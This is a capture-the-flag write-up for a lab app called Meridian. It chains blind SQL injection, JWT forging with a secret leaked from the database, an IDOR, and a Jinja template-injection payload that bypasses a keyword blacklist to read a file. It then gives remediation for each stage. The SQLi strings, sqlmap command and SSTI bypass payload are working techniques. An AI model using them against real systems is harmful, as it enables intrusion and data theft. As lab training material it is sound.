# Methodology — Meridian (Blind SQLi → JWT Forge → IDOR → Filtered SSTI)

My working notes while solving this five-stage chain, black-box, no credentials.

## 1. Enumeration & finding the SQLi

The GUI is simple. No creds given, but there's an email (`alice@contoso.com`) and a public invoice
lookup pre-filled with `INV-1001`, which returns:

```json
{"found":true,"ok":true,"status":"PAID"}
```

That boolean response smells like boolean-blind SQLi. Probing the `ref` parameter by hand:

```
INV-1001' AND 1=1 -- -   → failed
INV-1001' OR  1=1 -- -   → {"found":true,...}   ← injectable
INV-1001' OR FALSE -- -  → {"found":false,...}  ← clean true/false oracle
```

Confirmed a boolean-blind injection (UNION is WAF-blocked, errors swallowed).

## 2. Extracting the database

Confirmed manually, then used sqlmap to extract (backend: SQLite):

```bash
sqlmap -u "localhost:9005/api/invoice/lookup?ref=*" --level=4 --risk=3 --dump
```

Tables: `config, users, workspaces, settings, invoices`. Dumped the two that matter:

```
# users
id  wid  role     email               password
1   1    admin    ops@meridian.io     x
7   7    user     alice@contoso.com   x
...

# config
jwt_secret   = m3r1d14n_204ea05417c699c3
```

The signing secret should never be reachable from the application's own data — here it's sitting in a
table the SQLi can read.

## 3. Forging the JWT

The token is HS256. With the leaked secret I forge an admin token (no password needed):

```json
{"wid":1,"role":"admin","email":"ops@meridian.io"}
```

`GET /api/me` accepts it and returns `role: admin`. Set it in the browser console as `TOKEN` for the
app's own `fetch` calls.

## 4. IDOR — leaking the render token

The report renderer needs a separate `X-Render-Token`. That lives in the `settings` table, which I can
also read via the SQLi / the workspace-settings endpoint (no object-level authorization):

```
wid  render_token        render_enabled
1    rtok_c4703ce58bac    1     ← internal "Ops" workspace
7    rtok_disabled_7      0
9    rtok_disabled_9      0
```

Only workspace 1 has rendering enabled, and now I have its token.

## 5. Filtered SSTI → RCE

Send the render request with the forged JWT (`Authorization`) + the render token (`X-Render-Token`) +
`wid:1`. `{{7*7}}` returns `49` — template injection confirmed.

Standard gadgets are blocked by a keyword blacklist (`os`, `popen`, `globals`, `subprocess`, `mro`,
`subclasses`, `eval`, `exec`, `flag`, …). A blacklist is bypassable: split the blocked keywords with
string concatenation so no forbidden substring appears literally, and reach `open()` via builtins:

```jinja2
{{ url_for|attr('__glo'+'bals__')|attr('__getitem__')('__buil'+'tins__')|attr('__getitem__')('open')('/fla'+'g.txt')|attr('read')() }}
```
```
FLAG{sql1_jwt_1d0r_f1lt3r3d_sst1_m3r1d14n_ch41n}
```

## 6. Remediation (all four stages)

- **SQLi:** parameterized query (`WHERE ref = ?`) — the WAF becomes incidental, not the control.
- **JWT:** remove the secret from the database, load it from the environment / a secret manager, keep
  the algorithm pinned to HS256.
- **IDOR:** enforce object-level authorization — validate the session, then `wid == user.wid`
  (default-deny).
- **SSTI:** drop the blacklist; render user input through a Jinja **SandboxedEnvironment** so unsafe
  attribute access is blocked for any payload.
